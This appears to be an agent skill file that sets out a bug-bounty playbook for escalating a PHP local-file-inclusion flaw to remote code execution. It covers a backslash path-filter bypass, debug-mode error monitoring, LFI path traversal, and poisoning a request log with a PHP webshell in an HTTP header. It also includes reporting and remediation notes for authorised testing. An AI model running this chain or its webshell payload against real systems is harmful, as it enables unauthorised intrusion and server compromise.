---
name: lfi-to-rce-via-request-log-poisoning
description: Black-box to semi-white-box to RCE in PHP/LFI apps. Covers (1) an 'include + method-call' endpoint pattern (params like Model/Method that include a file then call a method -> LFI), (2) a path backslash (\\) prefix that bypasses a custom 404/WAF path filter (/\purl vs /\\purl), (3) using DEBUG MODE error output as an oracle — monitor an endpoint and alert on response-size change so a transient debug-on window reveals backend error details (file/line), (4) fuzzing for writable/log artifacts and reading .gitignore to find them, and (5) escalating LFI to RCE by finding a request-log file that captures user-controlled data (headers/path), then writing a PHP webshell into it and executing. Triggers on: callAny / Model / Method include endpoint, LFI to RCE via log file, backslash path bypass, debug mode monitoring, include()+method LFI, php webshell via header log poisoning.
---

# Black-box → LFI → RCE (include+method endpoint, backslash bypass, debug oracle, log-poison webshell)

A full chain for turning an unknown endpoint into RCE, plus the black-box→
semi-white-box moves that make it possible. Works best on PHP apps.

## 1 — Discover a hidden/management endpoint (from JS) and find the path-bypass

- Read the app's JS for unadvertised endpoints (a classic: `/ExtraServices`).
- A custom-404 (different from the host's normal 404) means a **path filter / WAF**
  is dropping some routes. Bypass it with a **backslash prefix**:
  ```
  /purl/test        -> 404
  /\purl/test       -> 200
  /ExtraServices/... -> 404  →  /\ExtraServices/... -> routes resolve
  ```
  (Also try `//`, `/./`, `/%2e`, case variants, and `%5c`.) Fuzz the endpoint once
  it's reachable.

## 2 — Recognize the include+method LFI pattern

An endpoint like `callAny` (params `Model` + `Method`) does:
```
include_once(Models/<Model>)   # includes the file for <Model>
<Model>::<Method>()            # ...then calls a method on it
```
Symptoms: the endpoint name suggests dynamic call (`call_user_func`/eval); POST/GET
params don't behave like a direct eval; and *every* wrong value returns 500 (because
the include fails) — masking what's happening. Payloads like `FUZZ=phpinfo`,
`php://input`, raw body code all fail because the backend is a **typed include+call**,
not an eval.

## 3 — Turn on the "oracle": monitor for DEBUG MODE

The developer runs with debug/error display **on in production intermittently**.
While it's on, a wrong call returns PHP error details (file + line + the offending
param):
```
Warning: Undefined array key "Model" ...
Warning: include_once(Models/): Failed to open stream ... Models/Method
```
These errors reveal the backend logic. **Don't rely on catching it live** — monitor
the endpoint and **alert when the response-size changes** (e.g. one of the many
endpoints has a different-size debug response) so you capture the next debug-on
window. (Monitor several endpoints/environments and push size-change alerts to a
channel you watch.)

From the captured errors you learn: it's `include_once("Models/" . <Model>)` then
calls method `<Method>` → a controllable **LFI** (`Model=../FUZZ`).

## 4 — Confirm the LFI and find a write/log primitive

LFI alone: you can include files, but including an arbitrary file + valid method is
hard to weaponize directly. The high-value move is to **write to the host**:
- Fuzz the web dir for clues: `Model=../FUZZ` → `.gitignore`, `log`, `LOG_Path`, etc.
- Read `.gitignore` → reveals writable dirs the dev didn't want commits of (logs).
- Find a **request-log file** that stores user-controlled data (headers, path,
  query). Here `.../test.txt` stored the **entire raw HTTP request of the
  X-ORIGINAL_URL** endpoint — anything you send in the request is written to disk.

## 5 — LFI → PHP webshell via the request log (RCE)

Once you have a file that echoes your request back into a .txt/.log served under web
root (or includable), **inject PHP into a header** and execute:
```
T: <?php system($_GET['cmd-old']); ?>
```
- The log line containing your header (with `<?php ... ?>`) becomes a PHP file.
- Because you can include/execute it (or it's under web root), request
  `?cmd-old=ls` → **RCE**.

PoC: `ls`, `whoami`, `id` — proof of command execution on the server.

## Reusable checklist
1. **JS/endpoint discovery** → fuzz the found endpoint (with the backslash-bypass if a
   custom 404 appears).
2. **Infer the backend pattern** from error/500 behavior; try param names Model/Method
   and process-substitution fuzzing `ffuf -w <(cat wordlist)`.
3. **Set up debug monitoring** (size-change alert) to capture error details.
4. **Confirm LFI** (`../`), then **read config/`.gitignore`** to find writable logs.
5. **Find a user-controlled-write** artifact (request-log capturing headers/path).
6. **Write a PHP webshell via a header** into that file and execute `?cmd=...`.
7. Chain responsibly: PoC with `ls`/`id` only; don't dump data.

## Reporting
- Classic **LFI → RCE** (CWE-98 / CWE-22 / CWE-94). Usually Critical/High.
- Include: the backslash path-bypass, the debug-error reveal, the `Model=../` LFI,
  the log file that captures the request, and the webshell-in-header PoC returning
  command output.
- Root cause: unsanitized `include()`/`call_user_func` path + method keys, missing
  WAF on backslash variants, debug output in production, and a request logger that
  writes unfiltered attacker-controlled content into an includable file.
- Fix: whitelist include-able models, validate method names, disable debug/display_errors
  in prod, sanitize what the request logger stores, and don't serve/include log files.

## Gotchas
- The include+call pattern means you MUST satisfy both Model (valid file) and Method
  (valid function) for a clean call — but a "failed include then method not reached"
  is still exploitable if the included file is executed/hits the log first.
- Backslash-bypass depends on the path normalization (Laravel/Symfony vs nginx vs a
  custom router) — test multiple variants.
- Debug-mode windows are short-lived; automate the monitor (size-change alert) or keep
  polling.
- RCE PoC: run `id`/`ls`, not destructive commands; stop there. Respect the program's
  rules on command execution.
